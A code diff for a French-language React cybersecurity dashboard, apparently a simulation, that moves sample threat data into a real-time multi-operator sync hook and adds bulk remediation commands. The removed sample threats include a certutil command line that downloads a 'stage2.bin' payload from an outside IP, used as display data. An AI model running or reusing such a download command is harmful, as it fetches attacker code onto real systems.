@@ -19,6 +19,8 @@ import { ThreatTimeline } from './components/ThreatTimeline';
 import { ThreatToastContainer } from './components/ThreatToast';
 import { PdfReportModal } from './components/PdfReportModal';
 import { HeuristicEngine } from './components/HeuristicEngine';
+import { CollabSyncModal } from './components/CollabSyncModal';
+import { useRealtimeSync } from './hooks/useRealtimeSync';
 import { TabId, ConsoleLogMessage, ThreatItem, ThreatNotification } from './types/cyberdefense';
 import { BOOSTED_POWERSHELL_SCRIPT } from './data/powershellScript';
 import { generateAndDownloadZip } from './utils/zipGenerator';
@@ -27,128 +29,7 @@ import { generateAndDownloadPdfReport } from './utils/pdfReportGenerator';
 export default function App() {
   const [activeTab, setActiveTab] = useState<TabId>('overview');
   const [isPdfModalOpen, setIsPdfModalOpen] = useState<boolean>(false);
-
-  const initialLogs: ConsoleLogMessage[] = [
-    {
-      id: '1',
-      timestamp: '07:35:01',
-      level: 'INFO',
-      tag: 'SYSTEM',
-      text: 'Initialisation de SpaceSec CyberDefense Suite v3.0 KERNEL EDITION...',
-    },
-    {
-      id: '2',
-      timestamp: '07:35:02',
-      level: 'OK',
-      tag: 'ELEVATION',
-      text: 'Vérification du bouclier UAC : Privilèges Administrateur confirmés (SID S-1-5-32-544).',
-    },
-    {
-      id: '3',
-      timestamp: '07:35:02',
-      level: 'KERNEL',
-      tag: 'P/INVOKE',
-      text: 'Acquisition des privilèges NT : SeDebugPrivilege et SeTakeOwnershipPrivilege activés avec succès.',
-    },
-    {
-      id: '4',
-      timestamp: '07:35:03',
-      level: 'INFO',
-      tag: 'DEFENDER',
-      text: 'Contrôle MpCmdRun.exe : Moteur de protection en temps réel détecté actif.',
-    },
-    {
-      id: '5',
-      timestamp: '07:35:05',
-      level: 'WARN',
-      tag: 'C2-HUNTER',
-      text: 'Connexion réseau suspecte détectée sur le port 4444 (PID 5824: svch0st_updater.exe -> 185.220.101.4).',
-    },
-    {
-      id: '6',
-      timestamp: '07:35:06',
-      level: 'ERROR',
-      tag: 'KERNEL-LOCK',
-      text: 'Fichier verrouillé par handle noyau ou TrustedInstaller : C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys',
-    },
-  ];
-
-  const [logs, setLogs] = useState<ConsoleLogMessage[]>(initialLogs);
-
-  const [threats, setThreats] = useState<ThreatItem[]>([
-    {
-      id: 't1',
-      name: 'Rootkit Driver Hook (Inaccessible aux Admins)',
-      category: 'Rootkit',
-      severity: 'CRITICAL',
-      targetPath: 'C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys',
-      mitreTechnique: 'T1014 - Rootkit Hooking',
-      lockedBySystem: true,
-      trustedInstallerLocked: true,
-      description: 'Pilote interceptant IRP_MJ_CREATE avec propriété verrouillée par NT SERVICE\\TrustedInstaller.',
-      status: 'ACTIVE',
-    },
-    {
-      id: 't2',
-      name: 'Trojan Swisyn Watchdog & C2 Beacon (Port 4444)',
-      category: 'Trojan',
-      severity: 'HIGH',
-      targetPath: 'C:\\Users\\User\\AppData\\Local\\Temp\\svch0st_updater.exe',
-      mitreTechnique: 'T1059.001 - PowerShell / T1071.001 C2',
-      lockedBySystem: true,
-      trustedInstallerLocked: false,
-      description: 'Processus mimant le service hôte Windows, communicant vers 185.220.101.4 avec surveillance mutuelle.',
-      status: 'ACTIVE',
-    },
-    {
-      id: 't3',
-      name: 'Abus LOLBin certutil.exe (Téléchargement Furtif)',
-      category: 'Persistence',
-      severity: 'MEDIUM',
-      targetPath: 'certutil.exe -urlcache -split -f http://185.220.101.4/stage2.bin',
-      mitreTechnique: 'T1105 - Ingress Tool Transfer',
-      lockedBySystem: false,
-      trustedInstallerLocked: false,
-      description: 'Téléchargement d\'un binaire encodé en utilisant un composant légitime de certificats Windows.',
-      status: 'ACTIVE',
-    },
-    {
-      id: 't4',
-      name: 'Piège IFEO Debugger sur Taskmgr & Defender',
-      category: 'Privilege',
-      severity: 'CRITICAL',
-      targetPath: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe',
-      mitreTechnique: 'T1546.012 - IFEO Debugger Trap',
-      lockedBySystem: false,
-      trustedInstallerLocked: true,
-      description: 'Détournement du Gestionnaire des Tâches via clé Debugger malveillante interdisant l\'inspection de la mémoire.',
-      status: 'ACTIVE',
-    },
-    {
-      id: 't5',
-      name: 'Abonnement Persistant WMI EventConsumer',
-      category: 'Persistence',
-      severity: 'HIGH',
-      targetPath: 'root\\subscription:__EventFilter -> svch0st_revive',
-      mitreTechnique: 'T1546.003 - WMI Event Subscription',
-      lockedBySystem: false,
-      trustedInstallerLocked: false,
-      description: 'Déclenchement automatique d\'une charge utile PowerShell masquée à chaque redémarrage ou intervalle fixe.',
-      status: 'ACTIVE',
-    },
-    {
-      id: 't6',
-      name: 'Flux NTFS Alternatif Caché (Zone.Identifier ADS)',
-      category: 'Memory',
-      severity: 'MEDIUM',
-      targetPath: 'C:\\Users\\Public\\payload.dll:hidden_stream',
-      mitreTechnique: 'T1564.004 - Alternate Data Streams',
-      lockedBySystem: false,
-      trustedInstallerLocked: false,
-      description: 'Binaire DLL dissimulé derrière un flux de données alternatif NTFS pour contourner les contrôles antiviraux superficiels.',
-      status: 'ACTIVE',
-    },
-  ]);
+  const [isCollabModalOpen, setIsCollabModalOpen] = useState<boolean>(false);
 
   const [threatToasts, setThreatToasts] = useState<ThreatNotification[]>([
     {
@@ -177,8 +58,6 @@ export default function App() {
     },
   ]);
 
-  const [isToastSimulationActive, setIsToastSimulationActive] = useState(true);
-
   const addThreatToast = (notification: Omit<ThreatNotification, 'id' | 'timestamp'>) => {
     const now = new Date();
     const timestamp = now.toTimeString().split(' ')[0];
@@ -189,6 +68,28 @@ export default function App() {
     };
     setThreatToasts(prev => [newToast, ...prev]);
   };
+
+  // Synchronized Multi-User Engine via WebSockets & REST Fallback
+  const {
+    threats,
+    logs,
+    activeUsersCount,
+    activeOperators,
+    currentOperator,
+    connectionStatus,
+    lastSyncTime,
+    mutateThreatStatus,
+    mutateBulkThreatStatus,
+    massDismissThreats,
+    restoreThreats,
+    addSharedLog,
+    clearSharedLogs,
+    resetThreats,
+  } = useRealtimeSync({
+    onNotification: addThreatToast,
+  });
+
+  const [isToastSimulationActive, setIsToastSimulationActive] = useState(true);
 
   const handleDismissToast = (id: string) => {
     setThreatToasts(prev => prev.filter(t => t.id !== id));
@@ -277,13 +178,13 @@ export default function App() {
     const now = new Date();
     const timestamp = now.toTimeString().split(' ')[0];
     const newLog: ConsoleLogMessage = {
-      id: `${Date.now()}-${Math.random()}`,
+      id: `log-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
       timestamp,
       level,
       text,
       tag,
     };
-    setLogs(prev => [...prev, newLog]);
+    addSharedLog(newLog);
 
     // Automatically raise a Threat Toast when a suspicious/critical event is logged
     if (level === 'ERROR' || level === 'WARN') {
@@ -364,7 +265,7 @@ export default function App() {
         setTimeout(() => {
           addLog('KERNEL', 'Phase 5 : Écriture dans HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\PendingFileRenameOperations.', 'BOOT-DELETE');
           addLog('OK', 'Phase 6 : Binaire écrasé à 0 octet. Le noyau Windows achèvera la destruction au prochain boot.', 'SUCCESS');
-          setThreats(prev => prev.map(t => t.targetPath === targetPath ? { ...t, status: 'SCHEDULED_BOOT_DELETE' } : t));
+          mutateThreatStatus(targetPath, targetPath, 'SCHEDULED_BOOT_DELETE');
         }, 1600);
         break;
 
@@ -377,6 +278,9 @@ export default function App() {
         addLog('WARN', `Exécution de taskkill /F /T sur le PID ${targetPid}...`, 'KILL');
         setTimeout(() => {
           addLog('OK', `Processus PID ${targetPid} et toute sa descendance de threads ont été abattus.`, 'KILL');
+          if (targetPid === '5824') {
+            mutateThreatStatus('t2', 'C:\\Users\\User\\AppData\\Local\\Temp\\svch0st_updater.exe', 'NEUTRALIZED');
+          }
         }, 400);
         break;
 
@@ -475,8 +379,73 @@ export default function App() {
         }, 500);
         break;
 
+      case 'bulk-unlock': {
+        const targetIds = parts.slice(1).join(' ').split(',').map(s => s.trim()).filter(Boolean);
+        const toRemediate = targetIds.length > 0
+          ? threats.filter(t => targetIds.includes(t.id))
+          : threats.filter(t => t.status === 'ACTIVE');
+        
+        if (toRemediate.length === 0) {
+          addLog('WARN', 'Aucune menace active trouvée pour l\'éradication groupée.', 'BULK');
+          break;
+        }
+
+        addLog('KERNEL', `Lancement de l'éradication kernel groupée sur ${toRemediate.length} menaces...`, 'BULK');
+        toRemediate.forEach((t, idx) => {
+          setTimeout(() => {
+            addLog('OK', `[${idx + 1}/${toRemediate.length}] Takeown & PendingFileRename sur ${t.name} (${t.targetPath})`, 'EXCISION');
+          }, (idx + 1) * 350);
+        });
+
+        setTimeout(() => {
+          mutateBulkThreatStatus(toRemediate.map(t => t.id), 'SCHEDULED_BOOT_DELETE', 'Éradication Kernel Groupée');
+          addLog('OK', `Protocole kernel appliqué avec succès sur les ${toRemediate.length} menaces ! Destruction planifiée au boot.`, 'SUCCESS');
+        }, (toRemediate.length + 1) * 350);
+        break;
+      }
+
+      case 'bulk-dismiss': {
+        const targetIds = parts.slice(1).join(' ').split(',').map(s => s.trim()).filter(Boolean);
+        const toDismiss = targetIds.length > 0
+          ? threats.filter(t => targetIds.includes(t.id))
+          : threats.filter(t => t.status === 'ACTIVE');
+
+        if (toDismiss.length === 0) {
+          addLog('WARN', 'Aucune menace à ignorer.', 'DISMISS');
+          break;
+        }
+
+        massDismissThreats(toDismiss.map(t => t.id));
+        addLog('INFO', `Rejet en masse : ${toDismiss.length} menace(s) marquées comme ignorées/rejetées.`, 'DISMISS');
+        break;
+      }
+
+      case 'bulk-quarantine': {
+        const targetIds = parts.slice(1).join(' ').split(',').map(s => s.trim()).filter(Boolean);
+        const toQuarantine = targetIds.length > 0
+          ? threats.filter(t => targetIds.includes(t.id))
+          : threats.filter(t => t.status === 'ACTIVE');
+
+        if (toQuarantine.length === 0) {
+          addLog('WARN', 'Aucune menace active pour mise en quarantaine.', 'QUARANTINE');
+          break;
+        }
+
+        mutateBulkThreatStatus(toQuarantine.map(t => t.id), 'QUARANTINED', 'Mise en quarantaine groupée');
+        addLog('OK', `${toQuarantine.length} menace(s) déplacée(s) dans le conteneur de quarantaine chiffré.`, 'QUARANTINE');
+        break;
+      }
+
       case 'clear':
-        setLogs([]);
+        clearSharedLogs();
+        break;
+
+      case 'sync':
+      case 'collab':
+      case 'users':
+      case 'operators':
+        setIsCollabModalOpen(true);
+        addLog('OK', `Centre Collaboratif Multi-Opérateur : ${activeUsersCount} analyste(s) connecté(s) en temps réel.`, 'COLLAB');
         break;
 
       case 'pdf':
@@ -659,6 +628,9 @@ export default function App() {
         onDownloadScript={handleDownloadScript}
         onDownloadZip={handleDownloadZip}
         onOpenPdfReport={() => setIsPdfModalOpen(true)}
+        activeUsersCount={activeUsersCount}
+        connectionStatus={connectionStatus}
+        onOpenCollabModal={() => setIsCollabModalOpen(true)}
       />
 
       {/* Main Container Viewport */}
@@ -670,6 +642,10 @@ export default function App() {
             threats={threats}
             onDownloadZip={handleDownloadZip}
             onOpenPdfReport={() => setIsPdfModalOpen(true)}
+            onMutateThreatStatus={mutateThreatStatus}
+            onBulkMutateThreatStatus={mutateBulkThreatStatus}
+            onMassDismissThreats={massDismissThreats}
+            onRestoreThreats={restoreThreats}
           />
         )}
 
@@ -710,7 +686,7 @@ export default function App() {
             <ConsoleTerminal
               logs={logs}
               onExecuteCommand={handleExecuteCommand}
-              onClearLogs={() => setLogs([])}
+              onClearLogs={clearSharedLogs}
               onExportReport={handleDownloadReport}
             />
 
@@ -772,9 +748,34 @@ export default function App() {
             <button onClick={() => setIsPdfModalOpen(true)} className="hover:text-rose-400 text-rose-300 font-semibold transition-colors flex items-center gap-1">
               <span>Rapport Forensique (PDF)</span>
             </button>
+            <button
+              onClick={() => setIsCollabModalOpen(true)}
+              className="hover:text-emerald-300 text-emerald-400 font-semibold transition-colors flex items-center gap-1.5"
+            >
+              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
+              <span>Synchro Multi-Opérateur ({activeUsersCount})</span>
+            </button>
           </div>
         </div>
       </footer>
+
+      {/* Multi-User Collaboration & Real-Time Sync Modal */}
+      <CollabSyncModal
+        isOpen={isCollabModalOpen}
+        onClose={() => setIsCollabModalOpen(false)}
+        activeUsersCount={activeUsersCount}
+        activeOperators={activeOperators}
+        currentOperator={currentOperator}
+        connectionStatus={connectionStatus}
+        lastSyncTime={lastSyncTime}
+        onResetThreats={() => {
+          resetThreats();
+          addLog('OK', 'Les menaces ont été réinitialisées sur le serveur pour tous les analystes connectés.', 'COLLAB');
+        }}
+        onTestBroadcast={() => {
+          addLog('WARN', `Alerte test émise par ${currentOperator?.name || 'votre session'} vers tous les opérateurs connectés !`, 'TEST-BROADCAST');
+        }}
+      />
 
       {/* Forensic PDF Report Modal */}
       <PdfReportModal
